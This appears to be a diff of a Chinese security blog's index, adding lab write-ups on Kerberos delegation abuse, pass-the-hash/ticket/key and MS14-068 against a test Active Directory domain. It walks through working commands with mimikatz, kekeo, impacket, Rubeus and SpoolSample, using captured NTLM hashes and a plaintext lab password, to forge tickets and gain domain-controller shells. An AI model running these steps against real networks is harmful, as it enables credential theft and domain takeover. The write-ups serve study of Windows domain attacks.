+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142007857.png" class title="image-20220317142007857">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142022983.png" class title="image-20220317142022983">
+
+<p>这里的tgt是第一次向kdc申请的ST1</p>
+<p>使用请求到的tgt进行s4uproxy伪造请求ST2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_PC2$@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142437649.png" class title="image-20220317142437649">
+
+
+
+<p>未进行ptt之前是不能访问DC的 </p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142727658.png" class title="image-20220317142727658">
+
+<p>使用mimikatz进行ptt,注意tgs别选错了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142746120.png" class title="image-20220317142746120">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317150805823.png" class title="image-20220317150805823">
+
+
+
+<p>注：这里一定要是以本机administrator打开的dir \\DC\c$，因为我们生成的票据是针对administrator账号的，虽然都是同一台主机但是administrator和普通用户moretz的票据是不同的</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317151028741.png" class title="image-20220317151028741">
+
+
+
+<h3 id="在域环境外通过约束委派进行攻击"><a href="#在域环境外通过约束委派进行攻击" class="headerlink" title="在域环境外通过约束委派进行攻击"></a>在域环境外通过约束委派进行攻击</h3><p>域外指的是通过隧道工具接入内网</p>
+<p>使用的是impacket工具包里面的一个脚本</p>
+<p>探测约束委派的用户和主机</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152901164.png" class title="image-20220317152901164">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152914875.png" class title="image-20220317152914875">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.93.30 -spn cifs/DC -impersonate administrator whoamianony.org/PC2$ -hash :46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153057662.png" class title="image-20220317153057662">
+
+
+
+<p>加载在ccache中的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153129374.png" class title="image-20220317153129374">
+
+
+
+<p>利用psexec.py可以直接登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -no-pass -k DC</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317155009305.png" class title="image-20220317155009305">
+
+<p>这里我不明白为什么能直接返回约束委派服务的主机的system的shell，我的约束委派主机是192.168.93.40 的moretz（PC2），设置的可以访问192.168.93.30 DC的cifs服务。预期可能是administrator的权限，但是返回了system权限不太懂。</p>
 ]]></content>
       <categories>
         <category>内网</category>
@@ -453,13 +508,13 @@
 
 <p>这里有坑，一定要把LM Hash的值全部替换成0，试了非常久，虽然抓到了LM Hash但是直接用LM Hash:NTML Hash或者只用NTML Hash都会提示身份认证有误，要把LM Hash的值改为0就没问题，我看网上博主有直接用NTML Hash的也可以成功，这里具体的原因我也不太懂。</p>
 <h3 id="三、impacket工具包"><a href="#三、impacket工具包" class="headerlink" title="三、impacket工具包"></a>三、impacket工具包</h3><p>smbclient.py插件，这里的32个0是LM Hash的值，随便写什么都可以，因为windows 2012过后默认关闭LM Hash</p>
-<p>python3 smbclient.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec WHOAMIANONY&#x2F;<a href="mailto:&#x41;&#x64;&#109;&#105;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#114;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x39;&#x33;&#46;&#51;&#x30;">&#x41;&#x64;&#109;&#105;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#114;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x39;&#x33;&#46;&#51;&#x30;</a></p>
+<p>python3 smbclient.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec WHOAMIANONY&#x2F;<a href="mailto:&#65;&#100;&#109;&#105;&#110;&#x69;&#115;&#116;&#x72;&#97;&#116;&#111;&#x72;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x39;&#x33;&#x2e;&#x33;&#48;">&#65;&#100;&#109;&#105;&#110;&#x69;&#115;&#116;&#x72;&#97;&#116;&#111;&#x72;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x39;&#x33;&#x2e;&#x33;&#48;</a></p>
 <img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308091716872.png" class title="image-20220308091716872">
 
 
 
 <p>smbexec.py插件使用</p>
-<p>python3 smbexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec <a href="mailto:&#65;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#114;&#x61;&#116;&#111;&#x72;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x39;&#51;&#x2e;&#51;&#48;">&#65;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#114;&#x61;&#116;&#111;&#x72;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x39;&#51;&#x2e;&#51;&#48;</a></p>
+<p>python3 smbexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec <a href="mailto:&#x41;&#x64;&#x6d;&#x69;&#110;&#x69;&#115;&#x74;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#57;&#x33;&#46;&#x33;&#48;">&#x41;&#x64;&#x6d;&#x69;&#110;&#x69;&#115;&#x74;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#57;&#x33;&#46;&#x33;&#48;</a></p>
 <img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308092612807.png" class title="image-20220308092612807">
 
 
@@ -588,7 +643,7 @@
 <p>需要在kali安装kerberos认证功能</p>
 <p>apt-get install krb5-user</p>
 <p>但是我使用此模块并没有成功弹回system的cmd。。。。。。</p>
-<p>python3 goldenPac.py -dc-ip 192.168.93.30 -target-ip 192.168.93.20 whoamianony.org&#x2F;administrator:<a href="mailto:&#x57;&#x68;&#111;&#x61;&#x6d;&#x69;&#x32;&#x30;&#50;&#x31;&#x40;&#68;&#x43;&#x2e;&#x77;&#104;&#x6f;&#97;&#109;&#x69;&#x61;&#x6e;&#111;&#110;&#121;&#46;&#x6f;&#x72;&#103;">&#x57;&#x68;&#111;&#x61;&#x6d;&#x69;&#x32;&#x30;&#50;&#x31;&#x40;&#68;&#x43;&#x2e;&#x77;&#104;&#x6f;&#97;&#109;&#x69;&#x61;&#x6e;&#111;&#110;&#121;&#46;&#x6f;&#x72;&#103;</a></p>
+<p>python3 goldenPac.py -dc-ip 192.168.93.30 -target-ip 192.168.93.20 whoamianony.org&#x2F;administrator:<a href="mailto:&#87;&#104;&#x6f;&#97;&#109;&#105;&#x32;&#48;&#x32;&#x31;&#x40;&#x44;&#67;&#46;&#x77;&#x68;&#111;&#x61;&#x6d;&#105;&#x61;&#110;&#x6f;&#110;&#x79;&#x2e;&#111;&#114;&#103;">&#87;&#104;&#x6f;&#97;&#109;&#105;&#x32;&#48;&#x32;&#x31;&#x40;&#x44;&#67;&#46;&#x77;&#x68;&#111;&#x61;&#x6d;&#105;&#x61;&#110;&#x6f;&#110;&#x79;&#x2e;&#111;&#114;&#103;</a></p>
 <img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308162840622.png" class title="image-20220308162840622">
 
 <h3 id="四、使用msf的模块"><a href="#四、使用msf的模块" class="headerlink" title="四、使用msf的模块"></a>四、使用msf的模块</h3><p>use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum</p>
@@ -603,7 +658,7 @@
 
 
 
-<p>将生成的<a href="mailto:&#x30;&#45;&#48;&#x30;&#x30;&#48;&#x30;&#x30;&#x30;&#x30;&#x2d;&#97;&#100;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x6b;&#114;&#x62;&#x74;&#x67;&#x74;&#x2d;&#x57;&#x48;&#x4f;&#65;&#77;&#73;&#65;&#78;&#x4f;&#x4e;&#89;&#x2e;&#x4f;&#x52;&#71;&#46;&#x6b;&#x69;&#x72;&#98;&#105;">&#x30;&#45;&#48;&#x30;&#x30;&#48;&#x30;&#x30;&#x30;&#x30;&#x2d;&#97;&#100;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x6b;&#114;&#x62;&#x74;&#x67;&#x74;&#x2d;&#x57;&#x48;&#x4f;&#65;&#77;&#73;&#65;&#78;&#x4f;&#x4e;&#89;&#x2e;&#x4f;&#x52;&#71;&#46;&#x6b;&#x69;&#x72;&#98;&#105;</a>拷贝回kali，通过kiwi模块导入</p>
+<p>将生成的<a href="mailto:&#48;&#x2d;&#x30;&#48;&#x30;&#48;&#48;&#48;&#x30;&#48;&#x2d;&#x61;&#100;&#x6d;&#x69;&#x6e;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#x72;&#x40;&#107;&#x72;&#98;&#x74;&#103;&#116;&#45;&#x57;&#72;&#79;&#x41;&#77;&#x49;&#x41;&#x4e;&#x4f;&#78;&#89;&#46;&#79;&#82;&#x47;&#x2e;&#x6b;&#105;&#114;&#98;&#105;">&#48;&#x2d;&#x30;&#48;&#x30;&#48;&#48;&#48;&#x30;&#48;&#x2d;&#x61;&#100;&#x6d;&#x69;&#x6e;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#x72;&#x40;&#107;&#x72;&#98;&#x74;&#103;&#116;&#45;&#x57;&#72;&#79;&#x41;&#77;&#x49;&#x41;&#x4e;&#x4f;&#78;&#89;&#46;&#79;&#82;&#x47;&#x2e;&#x6b;&#105;&#114;&#98;&#105;</a>拷贝回kali，通过kiwi模块导入</p>
 <p>这个地方导入的时候又出现了错误。。我查阅很多资料发现其他博主也会导入不成功，目前我还是没弄懂原因</p>
 <img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308170058648.png" class title="image-20220308170058648">
 
@@ -717,6 +772,150 @@
 <p>然后就可以进行远程连接了，可以进行dir \\DC\c$等操作，其实和pth非常类似</p>
 <h3 id="二、impacket工具包"><a href="#二、impacket工具包" class="headerlink" title="二、impacket工具包"></a>二、impacket工具包</h3><p>ptk也有很多impacket脚本使用，使用方法都大同小异，这里太累了就不演示了。</p>
 <p>总结：ptt&amp;pth&amp;ptk是域渗透中常见的横向移动与维权方法，之前刚学的时候，都只是大概知道怎么回事，时不时还会弄混，但是自己静下心来好好琢磨了一段时间过后发现其实这三种方法也不是很难，思路一下清晰了很多。对于文章来说的话，有些地方可能有小问题，有些地方还有不知原因的报错。但大体来说比较满意，因为文章只做自己复习学习用。</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>非约束委派的原理及利用</title>
+    <url>/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先需要了解什么是委派？</p>
+<p>委派一般出现在域环境当中，域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
+<p>说得再通俗一点就是，假设有三个对象</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316150047630.png" class title="image-20220316150047630">
+
+<p>当hostA作为用户，这个用户在访问服务B上的某一功能，而A访问B的这一功能的完成需要服务B向服务C上的专属于用户A的部分发起验证请求，如果A有访问权限，主机B就会代替主机A去访问主机C。也就是说主机A委派主机B上的服务代表自己向主机C上的服务发起请求。在域环境下就是域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
+<p>域委派主要分为两种，非约束委派和约束委派，还有一种基于资源的约束委派这里就不讨论了。</p>
+<h2 id="非约束委派的原理（Unconstrained-Delegation）"><a href="#非约束委派的原理（Unconstrained-Delegation）" class="headerlink" title="非约束委派的原理（Unconstrained Delegation）"></a>非约束委派的原理（Unconstrained Delegation）</h2><p>对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。那么非委派约束的攻击怎么产生的呢，就是诱导域管账号访问我们的被配置了非约束委派的主机，认证方式无论是kerberos还是ntlm都可以，这样子我们就拥有了域管的TGT，可以生成黄金票据。所以，非约束委派的主要目的就是获取域管账号的TGT，从而制作黄金票据。</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316145545395.png" class title="image-20220316145545395">
+
+<p>现在假设这么一种情形，service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p>
+<p>那么非约束性委派的过程可以大概理解为：</p>
+<p>1、用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>2、用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1。<br>3、service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2。</p>
+<h1 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控：192.168.93.30      主机名：DC</p>
+<p>域成员（配置了非约束性委派）：192.168.93.40   主机名：PC2  用户名：moretz</p>
+<p>域：whoamianony.org</p>
+<h2 id="0x01非约束委派配置及其特征"><a href="#0x01非约束委派配置及其特征" class="headerlink" title="0x01非约束委派配置及其特征"></a>0x01非约束委派配置及其特征</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">setspn -U -A <span class="title class_">MSSQLSvc</span>/mssql.<span class="property">whoamianony</span>.<span class="property">org</span>:<span class="number">1433</span> moretz</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230643559.png" class title="image-20220315230643559">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230824870.png" class title="image-20220315230824870">
+
+<p>域控创建了一个域内可以委派的账户并注册spn后，勾选信任此用户作为任何服务的委派，此时这台moretz账号的主机就可以作为委派访问任意服务并且存储需要他进行委派访问的主机，比如A需要委派moretz主机访问C，那么moretz主机就会保存A的tgt</p>
+<p>当服务账号或者主机被设置为非约束性委派时，其 <strong>userAccountControl</strong> 属性会包含 <strong>TRUSTED_FOR_DELEGATION</strong>：</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315230924720.png" class title="image-20220315230924720">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231033106.png" class title="image-20220315231033106">
+
+<h2 id="0x02查找域内的非约束委派主机"><a href="#0x02查找域内的非约束委派主机" class="headerlink" title="0x02查找域内的非约束委派主机"></a>0x02查找域内的非约束委派主机</h2><h3 id="Idapsearch"><a href="#Idapsearch" class="headerlink" title="Idapsearch"></a>Idapsearch</h3><p>这是一款kali上自带的工具，适合在域外查询委派主机</p>
+<p>查找用户是否配置非约束委派</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+<p>-w 参数后面跟的是moretz用户的密码</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231349030.png" class title="image-20220315231349030">
+
+<p>过滤条件是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查找配置为非约束委派的主机（域控的主机账号是默认开启非约束委派的）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315231419152.png" class title="image-20220315231419152">
+
+<p>过滤条件是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</span><br></pre></td></tr></table></figure>
+
+<p>两条查询语句的不同点就在于过滤条件的不同samAccountType&#x3D;805306369时为主机，samAccountType&#x3D;805306368时为用户</p>
+<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><p>有账号密码时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 192.168.93.30 -u users\moretz -up Moretz2021 -b &quot;DC=w</span><br><span class="line">hoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.1</span><br><span class="line">13556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232118802.png" class title="image-20220315232118802">
+
+<p>域控默认为非约束委派</p>
+<p>查询当前域内的非约束委派用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232256937.png" class title="image-20220315232256937">
+
+<p>可以看到这里的moretz用户就是非约束委派主机</p>
+<p>查询当前域内的非约束委派主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232355641.png" class title="image-20220315232355641">
+
+<p>还是过滤条件的不同</p>
+<p>其他工具还有powerview，个人还是喜欢AdFind</p>
+<h2 id="0x03非约束委派攻击"><a href="#0x03非约束委派攻击" class="headerlink" title="0x03非约束委派攻击"></a>0x03非约束委派攻击</h2><p>现在只有moretz自己的票据</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232506026.png" class title="image-20220315232506026">
+
+
+
+<p>若域内存在非约束委派机器，那么就可以使用域内我们想要获得票据的用户来登陆此非约束委派主机，从而在非约束委派主机中留下期望获得的主机票据的缓存</p>
+<p>这里先在域控主机（DC）上通过winrm连接域内的非委派主机（PC2）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName PC2</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232601340.png" class title="image-20220315232601340">
+
+<p>可以看到这里是成功连上了PC2，并且是administrator权限</p>
+<p>在ptt之前，是无法访问域控的</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220315232851871.png" class title="image-20220315232851871">
+
+
+
+<p>利用猕猴桃将域控的tgt导出来，因为域控连接过pc2，因此会有域控的tgt缓存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge </span><br><span class="line">sekurlsa::tickets /exports</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000914827.png" class title="image-20220316000914827">
+
+
+
+<p>进行ptt（票据传递），生成tgt票据（<strong>这里获得的票据不能算作黄金票据，我们获得的权限只是域控的本地管理权限，不能连接域控，黄金票据的条件是缺一不可的，但是我们可以获取所有用户的hash，制作真正的黄金票据</strong>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;291f51]-2-0-60a10000-Administrator@krbtgt-WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316000954582.png" class title="image-20220316000954582">
+
+
+
+<p>成功生成票据，接下来制作黄金票据的过程就不赘述了</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316001115188.png" class title="image-20220316001115188">
+
+
+
+
+
+<p>除了直接在域控使用winrm，还可以利用<strong>非约束委派+spooler打印机服务</strong>强制指定的主机进行连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe monitor /interval:1 filteruser:DC$ &gt; c:\users\hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用rubues来监听本机连接的情况，设置监听间隔为一秒，监控对象为域控的主机名</p>
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172630642.png" class title="image-20220316172630642">
+
+
+
+<p>运行spoolsample利用打印服务，强制让域控DC向域成员PC2验证身份，因为设置了rubeus监听，所以可以抓到TGS</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC PC2</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172651602.png" class title="image-20220316172651602">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172722495.png" class title="image-20220316172722495">
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316172913745.png" class title="image-20220316172913745">
+
+<p>这里报错了，但是的确rubeus抓到了base64加密的tgt(hash.txt)</p>
+<p>这里用powershell解密base64，其他方法也可以，但是powershell可以直接将tgt文件保存下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;c:\users\moretz.whoamianony\tgt.kirbi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;))</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174513722.png" class title="image-20220316174513722">
+
+
+
+<p>使用mimikatz导入票据后，跟之前一样也是个有域控本地管理员权限的，用mimikatz制作黄金票据后可以用psexec.exe反弹shell，不需要账号密码。（lsadump）</p>
